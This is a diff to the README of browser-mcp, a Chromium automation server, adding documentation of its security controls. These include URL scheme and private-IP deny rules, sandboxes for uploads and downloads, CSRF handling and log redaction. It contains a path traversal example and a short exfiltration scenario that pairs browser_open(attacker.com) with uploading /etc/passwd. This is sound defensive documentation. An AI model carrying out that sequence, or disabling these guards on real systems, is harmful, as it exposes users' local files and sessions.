@@ -667,7 +667,18 @@ All flags are optional — loopback-only defaults work out of the box. Priority:
 | `--settle-timeout-ms` | `BROWSER_MCP_SETTLE_TIMEOUT_MS` | `3000` | hard settle timeout after nav/click |
 | `--profile-dir` | `BROWSER_MCP_PROFILE_DIR` | `~/.browser-mcp/profiles` | profile base dir |
 
-`browser-mcp --help` prints the full list.
+### Safety opt-ins (env only — sharp-edge escape hatches)
+
+| Env | Default | Effect |
+|---|---|---|
+| `BROWSER_MCP_ALLOW_FILE_URLS` | `0` | Permit `file://` in `browser_open` / `browser_download_wait` |
+| `BROWSER_MCP_ALLOW_PRIVATE_NETWORKS` | `0` | Permit loopback / RFC1918 / link-local / ULA IPs |
+| `BROWSER_MCP_ALLOW_ANY_WRITE_PATH` | `0` | Disable write sandbox for `browser_save` / `browser_download_wait` |
+| `BROWSER_MCP_ALLOW_ANY_UPLOAD_PATH` | `0` | Disable read sandbox for `browser_upload` |
+| `BROWSER_MCP_SANDBOX_DIR` | `~/.browser-mcp` | Base dir for download / upload sandboxes |
+| `BROWSER_MCP_READ_BODY_TIMEOUT_MS` | `10000` | Wall-clock cap on HTTP body read (slow-loris) |
+
+`browser-mcp --help` prints the CLI list.
 
 ---
 
@@ -818,7 +829,10 @@ SIGINT/SIGTERM triggers:
 
 browser-mcp drives a real Chromium on your machine — anyone who can reach
 `/mcp` can visit arbitrary URLs, exfiltrate logged-in session cookies, solve
-CAPTCHAs in your name. The defaults are chosen so this can't happen by accident:
+CAPTCHAs in your name, and (without the guards below) read arbitrary local
+files. The defaults are chosen so this can't happen by accident:
+
+### Network-level guards
 
 - **Refuse-to-start insecure.** Bound to a non-loopback host (`0.0.0.0`, any
   LAN IP) AND no API key set? Exit code 2 with a loud error. Override with
@@ -827,21 +841,61 @@ CAPTCHAs in your name. The defaults are chosen so this can't happen by accident:
 - **CSRF defense.** `/mcp` POSTs must carry `Content-Type: application/json`
   (not a CORS-simple type — browsers must preflight and we don't answer
   OPTIONS). If an `Origin` header is present, it must match
-  `BROWSER_MCP_CORS_ORIGIN` (default `null` — only native clients like curl
-  and Claude Code, which send no `Origin`, are allowed).
+  `BROWSER_MCP_CORS_ORIGIN` (default **empty** — only native clients like
+  curl and Claude Code, which send no `Origin`, are allowed). The literal
+  string `null` in the allowlist opts in to sandboxed-iframe / `file://`
+  pages and is a CSRF vector on loopback without auth — it's **not** enabled
+  by default.
+- **Body size + slow-loris.** 1 MB per request max; the full body must arrive
+  within 10 s (or the socket is torn down). No slow-drip DoS.
 - **Timing-safe auth.** API key comparison uses `crypto.timingSafeEqual` so
   token guessing doesn't benefit from short-circuit string comparison.
-- **Session cap.** `max_sessions` (default 50) prevents resource exhaustion
-  by a misbehaving client.
-- **Body cap.** 1 MB per request — larger and the connection is closed.
-- **Env isolation.** `BROWSER_MCP_*` env vars (API key, host, caps) are
-  filtered out before Chromium is launched, so page scripts can't fingerprint
-  the supervisor config.
+- **Session cap.** `max_sessions` (default 50) prevents resource exhaustion.
 - **Profile-name regex.** `^[a-zA-Z0-9_-]{1,64}$` — enforced at the HTTP
   layer, so `../../etc/passwd` can't escape the profile base directory.
-- **No remote code execution surface.** browser-mcp does not eval server-side
-  user input. `browser_evaluate` runs JS in the *page* context (Chromium's
-  sandbox), not on the supervisor.
+
+### Tool-level guards
+
+The tool surface (`browser_open`, `browser_save`, `browser_upload`, etc.)
+can otherwise turn a reachable `/mcp` endpoint into a local file read /
+write primitive. Default-deny, opt-in where you need it:
+
+- **URL allowlist for navigation.** `browser_open`, `browser_download_wait`
+  (action=navigate), and `browser_permissions` (origin) accept only `http:`,
+  `https:`, and `about:blank` by default. `file://`, `javascript:`, `data:`,
+  `chrome:`, `view-source:`, and raw private-IP hosts (`127.0.0.0/8`,
+  `10/8`, `172.16–31/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`,
+  `fe80::/10`) are rejected. Opt in via:
+  - `BROWSER_MCP_ALLOW_FILE_URLS=1` — allow `file://` (for local fixtures).
+  - `BROWSER_MCP_ALLOW_PRIVATE_NETWORKS=1` — allow loopback / intranet /
+    cloud-metadata IPs. Required for Docker-compose setups that curl each
+    other by service name.
+- **Download / save sandbox.** `browser_save` and `browser_download_wait`
+  write into `~/.browser-mcp/downloads/<profile>/` by default. Relative
+  paths resolve against the sandbox; absolute paths that escape it are
+  rejected. `BROWSER_MCP_ALLOW_ANY_WRITE_PATH=1` disables the sandbox.
+- **Upload sandbox.** `browser_upload` reads from
+  `~/.browser-mcp/uploads/<profile>/`. Drop files there first, or set
+  `BROWSER_MCP_ALLOW_ANY_UPLOAD_PATH=1`. Without this, one `browser_open(
+  attacker.com)` + `browser_upload({ files: ["/etc/passwd"] })` exfiltrates
+  any file your uid can read.
+- **Sandbox base dir.** Override both sandboxes' root via
+  `BROWSER_MCP_SANDBOX_DIR` (defaults to `~/.browser-mcp`).
+- **Log redaction.** Tool args containing cookie values, typed text, JS
+  expressions, and filesystem paths are redacted in `withLog` stderr output
+  so centralized log collectors don't pick up passwords or session tokens.
+- **`browser_evaluate` result cap.** Output truncated at
+  `BROWSER_MCP_MAX_CHARS` (50 000 by default) so a page returning a 1 GB
+  array can't OOM the supervisor.
+
+### Not-attack-surface by construction
+
+- **No remote code execution on the supervisor.** There is no `eval` /
+  `child_process` / `vm` / `Function()` anywhere in `src/`. `browser_evaluate`
+  runs JS in Chromium's renderer sandbox, not on the supervisor.
+- **Env isolation.** `BROWSER_MCP_*` env vars (API key, host, caps) are
+  filtered out before Chromium is launched, so page scripts can't
+  fingerprint the supervisor config.
 
 Docker image binds to `0.0.0.0` and **requires** an API key — the
 refuse-to-start check kicks in without one.
